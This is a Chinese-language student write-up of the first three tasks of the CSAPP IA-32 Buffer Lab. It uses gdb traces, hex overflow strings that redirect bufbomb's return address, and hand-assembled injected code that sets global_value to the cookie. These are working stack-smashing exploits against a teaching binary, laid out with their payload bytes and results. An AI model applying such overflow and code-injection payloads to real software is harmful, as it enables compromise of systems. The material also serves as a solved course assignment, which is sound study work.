1. task1

解决思路和attack lab类似，不同的是IA-32下寄存器只有32位。

首先来看getbuf的汇编形式：

```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x080491f4 <+0>:		push   %ebp
   0x080491f5 <+1>:		mov    %esp,%ebp
   0x080491f7 <+3>:		sub    $0x38,%esp
   0x080491fa <+6>:		lea    -0x28(%ebp),%eax
   0x080491fd <+9>:		mov    %eax,(%esp)
   0x08049200 <+12>:	call   0x8048cfa <Gets>
   0x08049205 <+17>:	mov    $0x1,%eax
   0x0804920a <+22>:	leave  
   0x0804920b <+23>:	ret    
End of assembler dump.
```

注意这里一个特殊的地方就是这个leave指令，百度查它的语义：

```
leave ret指令详解
leave指令可以使栈做好返回的准备，它等价于mov %ebp,%esp，pop %ebp。首先是mov %ebp,%esp，当前保存的ebp的值使栈帧的栈底地址，所以这一句话的作用就是把esp给放回到调用者栈帧的栈顶，联系到进入函数时的语句mov %esp,%ebp，其实就是这个的逆过程，旨在恢复原来栈顶的状态。然后是pop %ebp，pop是对栈顶元素出栈，而现在的栈顶（也是栈底）存储的是调用者栈帧的栈底地址，这条指令就是把这一地址赋值给ebp（把被保存的ebp的值赋给寄存器ebp）。所以这句话就是恢复调用者栈帧的栈底，这样一来的话调用者栈帧旧基本上恢复到原来的状态了。
leave只是做好了返回的准备，我们调用完函数之后，调用者还需要接着向下执行指令，那么调用完函数以后就应该跳转到该函数的下一条指令的地址，我们的CALL指令就是先将下一条指令的地址入栈，然后跳转，这里ret的作用就是把那一个地址给弹出栈，并且跳转到地址对应的语句，再接着执行，这样一来一个函数就完整的执行了。
————————————————
版权声明：本文为CSDN博主「狍狍子」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/sakuraqwqqqqq/article/details/111879855
```

在来看具体行为：

分别在0x080491f7、0x0804920a、0x0804920b三处打上断点：

```
(gdb) b *0x080491f7
Breakpoint 1 at 0x80491f7
(gdb) b *0x0804920a
Breakpoint 2 at 0x804920a
(gdb) b *0x0804920b
Breakpoint 3 at 0x804920b
```

跑一下试试,, 顺便在第一个断点处看寄存器信息，为了清除起见，只保留了esp、ebp、eip三个寄存器的信息：

```
(gdb) run -u bovik
Starting program: /mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7

Breakpoint 1, 0x080491f7 in getbuf ()
(gdb) info r
...
esp            0x556835b0          0x556835b0 <_reserved+1037744>
ebp            0x556835b0          0x556835b0 <_reserved+1037744>
...                 
eip            0x80491f7           0x80491f7 <getbuf+3>
...
```

然后接着跑随便输入一个字符串：

```
(gdb) c
Continuing.
Type string:testString

Breakpoint 2, 0x0804920a in getbuf ()
(gdb) info r
...
esp            0x55683578          0x55683578 <_reserved+1037688>
ebp            0x556835b0          0x556835b0 <_reserved+1037744>
...
eip            0x804920a           0x804920a <getbuf+22>
...

(gdb) c
Continuing.

Breakpoint 3, 0x0804920b in getbuf ()
(gdb) info r
...
esp            0x556835b4          0x556835b4 <_reserved+1037748>
ebp            0x556835e0          0x556835e0 <_reserved+1037792>
...
eip            0x804920b           0x804920b <getbuf+23>
...
```

观察断点2的寄存器信息和断点3的寄存器信息，可以看到 leave函数就是将ebp的值——0x556835b0赋值给esp，此时esp=0x556835b0，然后栈顶再pop一下，此时esp=0x556835b4，然后执行ret。

那么我们只需要使得0x556835b4这个位置上是smoke函数的地址即可。

在第一个断点处，esp=0x556835b0，然后执行了：

```
0x080491f7 <+3>:		sub    $0x38,%esp
```

再来看getbuf中这一部分汇编代码：

```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x080491f4 <+0>:		push   %ebp
   0x080491f5 <+1>:		mov    %esp,%ebp
   0x080491f7 <+3>:		sub    $0x38,%esp
   0x080491fa <+6>:		lea    -0x28(%ebp),%eax      <---------
   0x080491fd <+9>:		mov    %eax,(%esp)           <---------
   0x08049200 <+12>:	call   0x8048cfa <Gets>      <---------
   0x08049205 <+17>:	mov    $0x1,%eax
   0x0804920a <+22>:	leave  
   0x0804920b <+23>:	ret    
End of assembler dump.
```

也就是说，字符串是从 0x556835b0 - 40 处开始输入的，而smoke函数的地址为0x08048c18，只需要使得输入字符串的栈结构如下即可：

![stack-task-1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stackVisual-task-1.png)

那么输入字符串就是：

```
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
18 8c 04 08
```

试验：

```
cat task1.txt | ./hex2raw | ./bufbomb -u bovik
```

结果：

![res-task1](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task1.png)



2. task2

和task1非常接近，只需要考虑把参数放在栈的哪个位置，首先来看fizz函数的代码：

```c
void fizz(int val)
{
	if (val == cookie) {
		printf("Fizz!: You called fizz(0x%x)\n", val);
		validate(1);
	} else
		printf("Misfire: You called fizz(0x%x)\n", val);
	exit(0);
}
```

看其汇编版本：

```
(gdb) disas fizz
Dump of assembler code for function fizz:
   0x08048c42 <+0>:		push   %ebp
   0x08048c43 <+1>:		mov    %esp,%ebp
   0x08048c45 <+3>:		sub    $0x18,%esp
   0x08048c48 <+6>:		mov    0x8(%ebp),%eax
   0x08048c4b <+9>:		cmp    0x804d108,%eax
   0x08048c51 <+15>:	jne    0x8048c79 <fizz+55>
   0x08048c53 <+17>:	mov    %eax,0x8(%esp)
   0x08048c57 <+21>:	movl   $0x804a4ee,0x4(%esp)
   0x08048c5f <+29>:	movl   $0x1,(%esp)
   0x08048c66 <+36>:	call   0x80489c0 <__printf_chk@plt>
   0x08048c6b <+41>:	movl   $0x1,(%esp)
   0x08048c72 <+48>:	call   0x804937b <validate>
   0x08048c77 <+53>:	jmp    0x8048c91 <fizz+79>
   0x08048c79 <+55>:	mov    %eax,0x8(%esp)
   0x08048c7d <+59>:	movl   $0x804a340,0x4(%esp)
   0x08048c85 <+67>:	movl   $0x1,(%esp)
   0x08048c8c <+74>:	call   0x80489c0 <__printf_chk@plt>
   0x08048c91 <+79>:	movl   $0x0,(%esp)
   0x08048c98 <+86>:	call   0x8048900 <exit@plt>
End of assembler dump.
```

在<+9>处执行的就是if (val == cookie)这个比较逻辑，也就是说让%eax中存着cookie就行，然后%eax中的值就是：

```
mov    0x8(%ebp),%eax
```

而ebp的值：

```
mov    %esp,%ebp
```

也就是说在ret时栈顶的位置+8

所以输入字符串的栈结构应为：

![stack-task-2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stackVisual-task-2.png)

那么输入字符串就是：

```
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
00 00 00 00
00 00 00 00 
42 8c 04 08
00 00 00 00
b7 b2 05 10
```

测试结果：

![res-task2](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task2.png)

3. task3

在bang函数中，global_value是全局变量，和cookie都存在常量区，因此首先找到这俩常量的存储地址，首先需要让getbuf跑到bang函数里：

```
vim task3.txt

00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
9d 8c 04 08
```

同时在bang函数中打上断点：

```
Breakpoint 1, 0x08048cae in bang ()
(gdb) disa
(gdb) disas
Dump of assembler code for function bang:
   0x08048c9d <+0>:		push   %ebp
   0x08048c9e <+1>:		mov    %esp,%ebp
   0x08048ca0 <+3>:		sub    $0x18,%esp
   0x08048ca3 <+6>:		mov    0x804d100,%eax
   0x08048ca8 <+11>:	cmp    0x804d108,%eax
=> 0x08048cae <+17>:	jne    0x8048cd6 <bang+57>
   0x08048cb0 <+19>:	mov    %eax,0x8(%esp)
   0x08048cb4 <+23>:	movl   $0x804a360,0x4(%esp)
   0x08048cbc <+31>:	movl   $0x1,(%esp)
   0x08048cc3 <+38>:	call   0x80489c0 <__printf_chk@plt>
   0x08048cc8 <+43>:	movl   $0x2,(%esp)
   0x08048ccf <+50>:	call   0x804937b <validate>
   0x08048cd4 <+55>:	jmp    0x8048cee <bang+81>
   0x08048cd6 <+57>:	mov    %eax,0x8(%esp)
   0x08048cda <+61>:	movl   $0x804a50c,0x4(%esp)
   0x08048ce2 <+69>:	movl   $0x1,(%esp)
   0x08048ce9 <+76>:	call   0x80489c0 <__printf_chk@plt>
   0x08048cee <+81>:	movl   $0x0,(%esp)
   0x08048cf5 <+88>:	call   0x8048900 <exit@plt>
End of assembler dump.
```

注意看断点的语句，其实就是比较内存地址0x804d100和0x804d108上的内容，那么看一下这两处存着什么：

```
(gdb) print (char *) 0x804d100
$7 = 0x804d100 <global_value> ""
(gdb) print (char *) 0x804d108
$10 = 0x804d108 <cookie> "\267\262\005\020\200\365\372"
(gdb) print /x *0x804d108
$14 = 0x1005b2b7
```

那么一目了然，0x804d100存的是global_value，0x804d108存的是cookie，写一段代码，把cookie值放到存global_value那个内存上，再给栈上压入bang函数地址然后ret

```
mov 0x804d108, %eax
mov %eax, 0x804d100
push $0x08048c9d
ret
```

获取其机器指令序列：

```
➜  buflab-handout git:(master) ✗ vim task3.s  
➜  buflab-handout git:(master) ✗ gcc -m32 -c task3.s
➜  buflab-handout git:(master) ✗ ls
 bufbomb                    res-task2.png      task2.txt
 hex2raw                    stack-task-1.png   task3.o
'how to buffer attack.md'   stack-task-2.png   task3raw.txt
 makecookie                 stackVisual.pptx   task3.s
 res-task1.png              task1.txt          task3.txt
➜  buflab-handout git:(master) ✗ objdump -d task3.o 

task3.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	a1 08 d1 04 08       	mov    0x804d108,%eax
   5:	a3 00 d1 04 08       	mov    %eax,0x804d100
   a:	68 9d 8c 04 08       	push   $0x8048c9d
   f:	c3 						ret
```

那么让栈结构如下所示即可：

![stackVisual-task-3](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/stackVisual-task-3.png)

新建一个

```
vim task3final.txt
```

写入

```
a1 08 d1 04
08 a3 00 d1
04 08 68 9d
8c 04 08 c3
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
88 35 68 55
```

试验：

```
➜  buflab-handout git:(master) ✗ cat task3final.txt | ./hex2raw | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Bang!: You set global_value to 0x1005b2b7
VALID
NICE JOB!
```

![res-task3](/mnt/projects/CSAPP-Assignments/my-solution/4-Buffer-Lab-IA32/buflab32-handout/buflab-handout/res-task3.png)